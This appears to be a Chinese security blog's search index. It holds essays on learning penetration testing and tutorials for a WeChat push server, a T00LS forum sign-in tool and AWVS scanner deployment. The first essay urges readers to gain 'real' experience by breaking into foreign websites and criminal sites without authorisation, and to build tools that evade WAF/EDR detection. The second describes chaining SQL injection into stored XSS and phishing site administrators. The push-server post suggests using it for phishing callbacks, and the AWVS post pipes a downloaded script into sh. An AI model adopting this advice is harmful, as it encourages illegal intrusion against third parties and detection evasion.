<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2月26日2:45</title>
    <link href="/2022/03/08/2%E6%9C%8826%E6%97%A52-45/"/>
    <url>/2022/03/08/2%E6%9C%8826%E6%97%A52-45/</url>
    
    <content type="html"><![CDATA[<p>现在2:45又醒了，既然睡不着就继续聊聊，关于渗透相关的事，以下都是我的个人见解，切莫当真。<br>  人的这一生都在不断学习中成长，感情，生活，工作，这些都是需要一定的时间学习并且实践才能摸索出一条属于自己的道路，切莫只选择一条路，而忽略了其他的路。<br>  关于渗透，现在国内的渗透学习，基本上已经固定了，刚入门的小白，要先经历一波，卖课的，知识星球，培训机构，这些先被割一波韭菜，然后再入门了，就去挖国内的src，去给被那些大厂压榨，最后工作，被资本家狠狠的pua加剥削，现在那些一线城市的安服都被压榨到一天一百的薪资了，居然还有人认为很不错•᷄ࡇ•᷅，红队和安全研究员工资现在普遍不高，当然我说的这都是实习工资，具体情况还得看个个厂商。<br>  src现在的漏洞价值和回报完全不成正比，而且国内src是压榨惯了吧？同样的厂商，提交一样类型的漏洞，国内src奖励几百，换到国外src就奖励几百美元了•᷄ࡇ•᷅，当然大家国内漏洞一定要提交到国内src或者cnnvd，别做损害国家利益的事！<br>  还有很多同学说要去实战，咋实战?第一国内的ip站点和资产不要做未授权的渗透测试，第二有漏洞可以及时上报，但别去进行漏洞测试，点到为止。做实战渗透测试，可以去针对jp，kr，tw，us，uk，in等，进行渗透测试实践，还有可以去渗透实践，一下违法犯罪的站点，bc，zp，hs，dapp，这些站点普遍都有所防范。能够拿下这些站点对于你们的技术水平会有所提高。<br>  最后最重要的一点就是，遇到困难和问题，要不断的去学习，并且专研去解决这个问题，相信通过解决这个问题的过程当中你会收获很多有用的经验，记住对于web渗透而言，http协议是一个很松散的协议，对于数据包的规范不严谨，所以可以有很多种可以绕过waf的办法。<br>  如果你入门了，并且有了一点渗透思维，你就会发现，常见的渗透工具好像都不怎么好用了，并不是说那个工具的功能不好，而是那些工具都被各大厂商给标记了，那些有名的工具，多多少少都能够找到一些独特的流量包特征，一般没有把工具进行魔改二开的话，流量就会被杀的死死的，到了这个阶段，就要学会自己造工具了，再这个阶段你也一定会有一点的需求，你可以根据你再渗透当中摸索出来的需求打造一个自己趁手的兵器，一般自己开发的工具都不会被waf，edr给监测到。再打造你自己的兵器的这个过程你又会收获很多意想不到的惊喜，如何让你的兵器更加隐蔽，如果让你的兵器更加好用，绕过流量监测等等，这些都是你会遇到并且解决的问题。<br>  还有一些以后再说吧，晚安。</p>]]></content>
    
    
    
    <tags>
      
      <tag>随笔杂谈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2月22日2:07</title>
    <link href="/2022/03/08/2%E6%9C%8822%E6%97%A52-07/"/>
    <url>/2022/03/08/2%E6%9C%8822%E6%97%A52-07/</url>
    
    <content type="html"><![CDATA[<p>  昨天晚上和朋友聊了一会，觉得要想增长渗透技术，还是要实践，那些卖课的，知识星球，各种培训机构，都是扯淡，都是割韭菜。<br>  现在睡不着，当然也有一些我自己的事情，哎，还是要好好珍惜眼前人，不能只搞技术，不要生活。现在就聊聊现在网安行业各位同仁该如何学习技术，渗透该怎么学?现在想一下问题，假如你遇到一个目标，你只找到一个sql注入，站库分离，没找到后台。这个时候你会想到几种渗透手法可以拿下目标?一种，两种，三种?还是一种都没有?可以说大部分的人能够想到的就一到两种，但是你的渗透经验多，实践日站拿目标多，你的心里会有很多很多种渗透手法可以拿下目标，比如说，你可以通过sql注入，往数据库写xss，然后等xss上线，或者xss写一些比较明显的话语违规词语让管理员尽早发现，这样xss尽早可以管理员，或者收集信息，伪装站点用户去和管理员说站点上有一些问题或者说有bug，把xss的url发送过去，立马打到。还有第二种，可以找sql上其他库，看看有没有旁站，日旁站，然后搞主站，还可以找找看有没有，phpMyAdmin，探针，等等。第三种，可以找一下，数据库中有没有文件地址，一般写了文件地址的，都可能存在文件包含漏洞。当然还有很多很多种渗透手法可以拿站。通过上面这个问题，肯定有很多同学一种手法都想不到，很多同学遇到sql注入只会想到sql拿密码找后台登录，遇到找不到后台站库分离更加没办法。因为很多同学都是ctf和培训机构或看网课视频出身，根本就没有实战经验，根本就不可能遇到这些问题，所以就不懂得怎么渗透。理论知识学了一大堆，一遇到实际问题，啥也不会，根本就没有实践经验，在脑子里没有一个渗透思维，渗透思维就是当你再拿下目标时遇到一个问题，你的脑子里会有很多种应对方法，因为这些方法都是你实践总结出来的经验，很多同学都是缺少实践经验，只学不做，根本就不懂渗透，根本就不能解决实际问题，你们用靶机练习渗透，模拟真实环境练习渗透，这些有用嘛？这就好比一头狼在一个羊圈中练习如何抓羊，根本就没有实践经验，狼再羊圈中抓羊，甚至都不用跑，腿都不用动，羊就到嘴里了，到最后狼能学会抓羊的技巧嘛？你们再靶机中练习渗透，靶机里面有管理员嘛？有运维人员嘛？有站长嘛？有edr，waf嘛？啥也没有纯粹的自娱自乐而已啊，根本就不能够增长你们的实战经验，更别谈渗透思维了，渗透是要不断的实践，然后通过一次又一次的实践来累计经验，更迭渗透手法，从而提升你们渗透技术的，还有那些培训机构，纯纯的都是智商税，割韭菜，他们不是靠渗透赚钱，而是靠教你们渗透来赚钱，这样的老师会是好老师嘛？就好比那些网上教你怎么发财的，他们发财是靠教你如何发财，这不是很讽刺嘛？如果真的很厉害，别人也早去大厂划水了，就算有些人，真的很厉害，是技术大佬因为一些原因，或者打算退休息养老，开堂授课，你要想清楚一个事情，他们的渗透思维，和实践经验，是你能够学的到嘛？就好比罗永浩卖课，你学了能和罗永浩一样牛逼?那你先得和罗永浩一样再出来买课前得在新东方年薪百万，然后进军手机行业整个6亿欠款。还有一点，我觉得很多时候渗透的目标不是机器而是人！这点是再真实的靶场和红蓝对抗都模拟不出来的。还有国外的资源和文章比国内的好太多，自己专研一下如何上网。<br>  最后我不是叫你们去随意日站，现在不同以往，现在有着完善的网络安全法规，要好好读一读网络安全法，也要擦亮你们的双眼，不要自己做安全的还会被别人割韭菜。还有我也不是什么圈内人事，也不认识啥圈内认识，我只是一个还没毕业的学生，以上只是我无聊时候的一些胡言乱语，切莫当真。</p>]]></content>
    
    
    
    <tags>
      
      <tag>随笔杂谈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实现server酱同款微信推送</title>
    <link href="/2021/11/06/%E5%AE%9E%E7%8E%B0server%E9%85%B1%E5%90%8C%E6%AC%BE%E5%BE%AE%E4%BF%A1%E6%8E%A8%E9%80%81/"/>
    <url>/2021/11/06/%E5%AE%9E%E7%8E%B0server%E9%85%B1%E5%90%8C%E6%AC%BE%E5%BE%AE%E4%BF%A1%E6%8E%A8%E9%80%81/</url>
    
    <content type="html"><![CDATA[<h1 id="实现server酱同款微信推送"><a href="#实现server酱同款微信推送" class="headerlink" title="实现server酱同款微信推送"></a>实现server酱同款微信推送</h1><p><img src="/%E5%AE%9E%E7%8E%B0server%E9%85%B1%E5%90%8C%E6%AC%BE%E5%BE%AE%E4%BF%A1%E6%8E%A8%E9%80%81/10.gif" alt="10"></p><p>这次是因为，新版server酱要收费，还限制一分钟，只能推送5条信息，以前一直用的老版本的，但是老版本的也限制了推送数量，每天一百条，就麻烦，所以就不麻烦service酱的服务器来做推送服务了，咱们自己造一个，原理很简的，就是调用微信公众号的接口，来实现模板消息推送</p><span id="more"></span><p>应为我的公众号再创建的时候选择的是个人，所以不能进行认证，也就不能给用户推送模板消息，所以此程序是基于微信公众平台接口测试，来实现的微信公众号消息推送的，每个人都可以到这里去申请测试号</p><p><code>https://mp.weixin.qq.com/debug/cgi-bin/sandbox?t=sandbox/login</code></p><p>账号登录成功后，把appID，appsecret，写入配置文件，</p><p><img src="/%E5%AE%9E%E7%8E%B0server%E9%85%B1%E5%90%8C%E6%AC%BE%E5%BE%AE%E4%BF%A1%E6%8E%A8%E9%80%81/6.png" alt="6"></p><p>然后再测试号二维码，扫描关注测试公众号，会获得一个微信号，把获取的微信号写入数据库表中，详情看下面数据库配置，应为我的公众号不能认证，也就没有写用户注册的功能，只能手动将用户消息添加到数据库中</p><p><img src="/%E5%AE%9E%E7%8E%B0server%E9%85%B1%E5%90%8C%E6%AC%BE%E5%BE%AE%E4%BF%A1%E6%8E%A8%E9%80%81/7.png" alt="7"></p><p>最后在模板消息接口新增模板</p><p>模板标题随意填写，可以写，文章推送</p><p>模板内容：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">title1.DATA</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">title2.DATA</span>&#125;&#125;</span><span class="language-xml"> </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">content1.DATA</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">title3.DATA</span>&#125;&#125;</span><span class="language-xml"> </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">content2.DATA</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">title4.DATA</span>&#125;&#125;</span><span class="language-xml"> </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">content3.DATA</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>配置完成后，会有一个模板ID，把模板id，写入配置文件中的，Templateid中，一切都配置完成后，即可运行程序</p><p><img src="/%E5%AE%9E%E7%8E%B0server%E9%85%B1%E5%90%8C%E6%AC%BE%E5%BE%AE%E4%BF%A1%E6%8E%A8%E9%80%81/8.png" alt="8"></p><p>消息推送：</p><p>urlPath：&#x2F;msg?msgcontent&#x3D;这是消息内容&amp;msgtitle&#x3D;这是消息标题&amp;nameid&#x3D;kosakd</p><p>三个参数，msgtitle : 消息标题，msgcontent : 消息内容，nameid : 用户名</p><p>可以GET&#x2F;POST提交请求</p><p>成功推送发送返回：推送成功，</p><p>则推送失败否则返回：参数错误。</p><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>配置文件在，&#x2F;conf&#x2F;conf.yaml，具体参数看注释有详解</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># 配置文件</span><br><br><br><span class="hljs-attr">Server:</span><br>  <span class="hljs-attr">Ip:</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-comment">#这是服务ip,留空代表本机</span><br>  <span class="hljs-attr">Port:</span> <span class="hljs-string">&quot;80&quot;</span> <span class="hljs-comment">#服务端口号</span><br>  <span class="hljs-attr">ReadTimeout:</span> <span class="hljs-number">10</span> <span class="hljs-comment">#web服务请求延迟,单位为秒</span><br>  <span class="hljs-attr">WriteTimeout:</span> <span class="hljs-number">10</span> <span class="hljs-comment">#web服务响应延迟，单位为秒</span><br><br><span class="hljs-attr">VxPush:</span><br>  <span class="hljs-attr">Appid:</span> <span class="hljs-string">&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span> <span class="hljs-comment">#appID</span><br>  <span class="hljs-attr">Secret:</span> <span class="hljs-string">&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span> <span class="hljs-comment">#appsecret</span><br>  <span class="hljs-attr">Templateid:</span> <span class="hljs-string">&quot;tmsxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span> <span class="hljs-comment">#模板ID</span><br>  <span class="hljs-attr">Url:</span> <span class="hljs-string">&quot;https://kosakd.top&quot;</span> <span class="hljs-comment">#推送到微信模板消息中的url，自定义</span><br><br><span class="hljs-attr">Mysql:</span><br>  <span class="hljs-attr">Addr:</span> <span class="hljs-string">&quot;localhost:3306&quot;</span> <span class="hljs-comment">#mysql服务连接的id和端口</span><br>  <span class="hljs-attr">User:</span> <span class="hljs-string">&quot;kosakd&quot;</span> <span class="hljs-comment">#mysql的用户名</span><br>  <span class="hljs-attr">Passowrd:</span> <span class="hljs-string">&quot;kosakd&quot;</span> <span class="hljs-comment">#mysql的用户密码</span><br>  <span class="hljs-attr">DbName:</span> <span class="hljs-string">&quot;testpush&quot;</span> <span class="hljs-comment">#mysql的指定数据库名</span><br>  <br>  <br></code></pre></td></tr></table></figure><h2 id="创建一个数据库，导入sql文件"><a href="#创建一个数据库，导入sql文件" class="headerlink" title="创建一个数据库，导入sql文件"></a>创建一个数据库，导入sql文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE DATABASE IF NOT EXISTS testPush DEFAULT CHARSET utf8 COLLATE utf8_general_ci;<br><br>use testPush;<br><br>source testpush.sql;<br>--最后手动添加一条用户数据，（用户名，关注公众号的微信号，这里的微信号是指获取关注测试公众号的微信号）<br>INSERT INTO `userpush` VALUES (&#x27;kosakd&#x27;, &#x27;o-xxxxxx&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/%E5%AE%9E%E7%8E%B0server%E9%85%B1%E5%90%8C%E6%AC%BE%E5%BE%AE%E4%BF%A1%E6%8E%A8%E9%80%81/1.png" alt="1"></p><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><ul><li>​可以直接下载对应系统，编译好了的文件，设置下配置文件，就可以直接运行，当然要确保，mysql服务开启了，数据库和数据表创建了</li></ul><p><img src="/%E5%AE%9E%E7%8E%B0server%E9%85%B1%E5%90%8C%E6%AC%BE%E5%BE%AE%E4%BF%A1%E6%8E%A8%E9%80%81/2.png" alt="2"></p><p>直接运行pushServerV1.1.exe,然后访问，你的web服务器，path &#x2F; 正常的话会显示</p><p><img src="/%E5%AE%9E%E7%8E%B0server%E9%85%B1%E5%90%8C%E6%AC%BE%E5%BE%AE%E4%BF%A1%E6%8E%A8%E9%80%81/3.png" alt="3"></p><p> 发送一条消息，&#x2F;msgpush?msgcontent&#x3D;这是内容111111&amp;msgtitle&#x3D;这是2222标题&amp;nameid&#x3D;kosakd</p><p>成功推送发送，推送成功，否则是，参数错误，则推送失败</p><p><img src="/%E5%AE%9E%E7%8E%B0server%E9%85%B1%E5%90%8C%E6%AC%BE%E5%BE%AE%E4%BF%A1%E6%8E%A8%E9%80%81/4.png" alt="4"><img src="/%E5%AE%9E%E7%8E%B0server%E9%85%B1%E5%90%8C%E6%AC%BE%E5%BE%AE%E4%BF%A1%E6%8E%A8%E9%80%81/5.png" alt="2"></p><ul><li><p>编译运行</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vim">git clone https://github.<span class="hljs-keyword">com</span>/kosakd/kosakdPush.git<br><span class="hljs-keyword">cd</span> kosakdPush<br>linux:<br><span class="hljs-keyword">go</span> env -<span class="hljs-keyword">w</span> GOOS=linux<br><span class="hljs-keyword">go</span> build -<span class="hljs-keyword">o</span> kosakdPush main.<span class="hljs-keyword">go</span><br>chmod <span class="hljs-number">777</span> kosakdPush&amp;&amp;./kosakdPush<br>windows:<br><span class="hljs-keyword">go</span> env -<span class="hljs-keyword">w</span> GOOS=windows<br><span class="hljs-keyword">go</span> build -<span class="hljs-keyword">o</span> kosakdPush.<span class="hljs-keyword">exe</span> main.<span class="hljs-keyword">go</span><br>kosakdPush.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><p>这个版本的程序还是只有一个微信推送功能，你们有想法可以，去扩展接口，增加一些推送接口，比如说，企业微信，钉钉，pustPuls，tg，这些，只要写对应的推送功能函数就行，在数据表中，添加给关键字，来选择是什么推送，还可以多设置几个推送模板，实现不同消息模板推送，这样一眼就能够看出来是，文章推送，还是主机上线，还是钓鱼上线，最主要的是这个程序也是个整合推送接口，看你怎么使用了，结合自己的工具来实现消息实时推送了，比如说爬虫，钓鱼，漏洞扫描结果，这些需要长时间才出结果的程序，最后可以写一个app，来查询当前用户发送的所有消息，类似于server酱的app，服务器端写一个接口放出加密的所有信息，app接受解密显示（以上这些功能我已经再最新版本实现了，但是为了程序安全，还是只放出这个版本出来 ：）</p><h2 id="个人博客微信公众号："><a href="#个人博客微信公众号：" class="headerlink" title="个人博客微信公众号："></a>个人博客微信公众号：</h2><p>Blog,<a href="https://kosakd.top/">kosakd.top</a></p><p>公众号：kosakd</p><p><img src="/img/9.png" alt="9"></p>]]></content>
    
    
    <categories>
      
      <category>技术分享</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>工具分享</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>T00LS文章更新提醒，自动签到，域名查询</title>
    <link href="/2021/10/29/T00LS%E6%96%87%E7%AB%A0%E6%9B%B4%E6%96%B0%E6%8F%90%E9%86%92%EF%BC%8C%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%EF%BC%8C%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2/"/>
    <url>/2021/10/29/T00LS%E6%96%87%E7%AB%A0%E6%9B%B4%E6%96%B0%E6%8F%90%E9%86%92%EF%BC%8C%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%EF%BC%8C%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2/</url>
    
    <content type="html"><![CDATA[<p><img src="/T00LS%E6%96%87%E7%AB%A0%E6%9B%B4%E6%96%B0%E6%8F%90%E9%86%92%EF%BC%8C%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%EF%BC%8C%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2/sao.png" alt="sao"></p><h1 id="T00LS文章更新提醒，自动签到，域名查询"><a href="#T00LS文章更新提醒，自动签到，域名查询" class="headerlink" title="T00LS文章更新提醒，自动签到，域名查询"></a>T00LS文章更新提醒，自动签到，域名查询</h1><h3 id="此程序是基于，T00LS的api和server酱api实现，程序自动签到，和新文章更新提醒"><a href="#此程序是基于，T00LS的api和server酱api实现，程序自动签到，和新文章更新提醒" class="headerlink" title="此程序是基于，T00LS的api和server酱api实现，程序自动签到，和新文章更新提醒"></a>此程序是基于，T00LS的api和server酱api实现，程序自动签到，和新文章更新提醒</h3><h4 id="此版本，是一晚上赶工做出来的，突然懒癌发作不想一页一页翻论坛，就写个程序，可能代码有些凌乱，下一个版本会整改下代码，并且添加多个提醒api，钉钉机器人推送，server酱推送，Telegram机器人推送，配置文件将会单独开一个yaml文件"><a href="#此版本，是一晚上赶工做出来的，突然懒癌发作不想一页一页翻论坛，就写个程序，可能代码有些凌乱，下一个版本会整改下代码，并且添加多个提醒api，钉钉机器人推送，server酱推送，Telegram机器人推送，配置文件将会单独开一个yaml文件" class="headerlink" title="此版本，是一晚上赶工做出来的，突然懒癌发作不想一页一页翻论坛，就写个程序，可能代码有些凌乱，下一个版本会整改下代码，并且添加多个提醒api，钉钉机器人推送，server酱推送，Telegram机器人推送，配置文件将会单独开一个yaml文件"></a>此版本，是一晚上赶工做出来的，突然懒癌发作不想一页一页翻论坛，就写个程序，可能代码有些凌乱，下一个版本会整改下代码，并且添加多个提醒api，钉钉机器人推送，server酱推送，Telegram机器人推送，配置文件将会单独开一个yaml文件</h4><span id="more"></span><h3 id="main-go中可以配置"><a href="#main-go中可以配置" class="headerlink" title="main.go中可以配置"></a>main.go中可以配置</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go">action      = <span class="hljs-string">&quot;login&quot;</span><br>username    = <span class="hljs-string">&quot;kosakd&quot;</span>                                                  <span class="hljs-comment">//用户名</span><br>password    = <span class="hljs-string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span>                        <span class="hljs-comment">//密码md5 32位</span><br>questionid  = <span class="hljs-string">&quot;1&quot;</span>                                                       <span class="hljs-comment">//安全问题ID，默认0为未设置</span><br>answer      = <span class="hljs-string">&quot;kosad&quot;</span>                                                  <span class="hljs-comment">//安全问题答案</span><br>sendkey     = <span class="hljs-string">&quot;SCUxxxxxxxxxxxxxxxxxxx&quot;</span> <span class="hljs-comment">//Server酱sendkey</span><br>Url         = <span class="hljs-string">&quot;https://www.t00ls.cc/All-articles.json&quot;</span>                  <span class="hljs-comment">//api的url</span><br>ToolsUrl    = <span class="hljs-string">&quot;https://www.t00ls.cc&quot;</span>                                    <span class="hljs-comment">//tools的url</span><br>Pages       = <span class="hljs-number">10</span>                                                        <span class="hljs-comment">//获取的页数</span><br>PageNumbers = <span class="hljs-number">10</span>                                                        <span class="hljs-comment">//每页获取多少条数据</span><br></code></pre></td></tr></table></figure><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell">git clone https://github.com/kosakd/T00ls.git<br><span class="hljs-built_in">cd</span> T00<span class="hljs-built_in">ls</span><br>linux:<br>go env <span class="hljs-literal">-w</span> linux<br>go build <span class="hljs-literal">-o</span> tools GOOS=main.go<br>chmod <span class="hljs-number">777</span> tools&amp;&amp;./tools<br>windows:<br>go env <span class="hljs-literal">-w</span> GOOS=windows<br>go build <span class="hljs-literal">-o</span> tools.exe main.go<br>tools.exe<br></code></pre></td></tr></table></figure><p><img src="/T00LS%E6%96%87%E7%AB%A0%E6%9B%B4%E6%96%B0%E6%8F%90%E9%86%92%EF%BC%8C%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%EF%BC%8C%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2/1.png" alt="1"></p><p><img src="/T00LS%E6%96%87%E7%AB%A0%E6%9B%B4%E6%96%B0%E6%8F%90%E9%86%92%EF%BC%8C%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%EF%BC%8C%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2/2.png" alt="2"></p><h4 id="建议布置在云函数上，执行一次，会一直循环，签到脚本会每过24小时执行一次，文章更新会每15分钟查询一次"><a href="#建议布置在云函数上，执行一次，会一直循环，签到脚本会每过24小时执行一次，文章更新会每15分钟查询一次" class="headerlink" title="建议布置在云函数上，执行一次，会一直循环，签到脚本会每过24小时执行一次，文章更新会每15分钟查询一次"></a>建议布置在云函数上，执行一次，会一直循环，签到脚本会每过24小时执行一次，文章更新会每15分钟查询一次</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">再自己的服务器上布置<br>go env -w GOOS=linux<br>go build -o main main.go<br>chmod 777 main<br>nohup main &amp;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">云函数布置<br>go env -w GOOS=linux<br>go build -o main main.go<br>zip main main.zip<br>选择go，直接上传zip包，布置函数就行<br></code></pre></td></tr></table></figure><h3 id="最后，如果想要看文章推送的效果，可以把GetAllArticles-go，文件中的Put-articles-的注释"><a href="#最后，如果想要看文章推送的效果，可以把GetAllArticles-go，文件中的Put-articles-的注释" class="headerlink" title="最后，如果想要看文章推送的效果，可以把GetAllArticles.go，文件中的Put_articles()的注释"></a>最后，如果想要看文章推送的效果，可以把GetAllArticles.go，文件中的Put_articles()的注释</h3><p><img src="/T00LS%E6%96%87%E7%AB%A0%E6%9B%B4%E6%96%B0%E6%8F%90%E9%86%92%EF%BC%8C%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%EF%BC%8C%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2/3.png" alt="3"></p><p><img src="/T00LS%E6%96%87%E7%AB%A0%E6%9B%B4%E6%96%B0%E6%8F%90%E9%86%92%EF%BC%8C%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%EF%BC%8C%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2/4.png" alt="4"></p><p><img src="/T00LS%E6%96%87%E7%AB%A0%E6%9B%B4%E6%96%B0%E6%8F%90%E9%86%92%EF%BC%8C%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%EF%BC%8C%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2/8.png" alt="8"><img src="/T00LS%E6%96%87%E7%AB%A0%E6%9B%B4%E6%96%B0%E6%8F%90%E9%86%92%EF%BC%8C%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%EF%BC%8C%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2/9.png" alt="9"></p><p><img src="/T00LS%E6%96%87%E7%AB%A0%E6%9B%B4%E6%96%B0%E6%8F%90%E9%86%92%EF%BC%8C%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%EF%BC%8C%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2/7.png"></p><p><img src="/T00LS%E6%96%87%E7%AB%A0%E6%9B%B4%E6%96%B0%E6%8F%90%E9%86%92%EF%BC%8C%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%EF%BC%8C%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2/5.png" alt="5"></p><p><img src="/T00LS%E6%96%87%E7%AB%A0%E6%9B%B4%E6%96%B0%E6%8F%90%E9%86%92%EF%BC%8C%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%EF%BC%8C%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2/6.png" alt="6"></p><h3 id="一个很简单go程序"><a href="#一个很简单go程序" class="headerlink" title="一个很简单go程序"></a>一个很简单go程序</h3>]]></content>
    
    
    <categories>
      
      <category>技术分享</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>T00LS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AWVS14_Tips</title>
    <link href="/2021/07/04/AWVS14_Tips/"/>
    <url>/2021/07/04/AWVS14_Tips/</url>
    
    <content type="html"><![CDATA[<p><img src="/AWVS14_Tips/sao.png" alt="sao"></p><h2 id="Awvs14"><a href="#Awvs14" class="headerlink" title="Awvs14"></a>Awvs14</h2><p>​AWVS扫描器强大的爬虫功能不言而喻，AWVS+xray现在都是主流打法，前个礼拜看到了AWVS14有docker环境，这篇笔记记录下，布置的流程，也没啥，布置完成后突然有个想法，希望看到最后</p><p><img src="/AWVS14_Tips/1.jpg" alt="1"></p><span id="more"></span><h2 id="Dokcer环境安装"><a href="#Dokcer环境安装" class="headerlink" title="Dokcer环境安装"></a>Dokcer环境安装</h2><p>​docker安装 </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl -sSL https://get.daocloud.io/docker | sh<br></code></pre></td></tr></table></figure><p>docker Hub镜像加速</p><p>创建或修改 <code>/etc/docker/daemon.json</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo <span class="hljs-built_in">mkdir</span> -p /etc/docker<br>sudo <span class="hljs-built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="hljs-string">&#x27;EOF&#x27;</span><br>&#123;<br>    <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<br>        <span class="hljs-string">&quot;https://1nj0zren.mirror.aliyuncs.com&quot;</span>,<br>        <span class="hljs-string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>,<br>        <span class="hljs-string">&quot;http://f1361db2.m.daocloud.io&quot;</span>,<br>        <span class="hljs-string">&quot;https://registry.docker-cn.com&quot;</span><br>    ]<br>&#125;<br>EOF<br>sudo systemctl daemon-reload<br>sudo systemctl restart docker<br></code></pre></td></tr></table></figure><h2 id="AWVS14-Dokcer环境部署"><a href="#AWVS14-Dokcer环境部署" class="headerlink" title="AWVS14 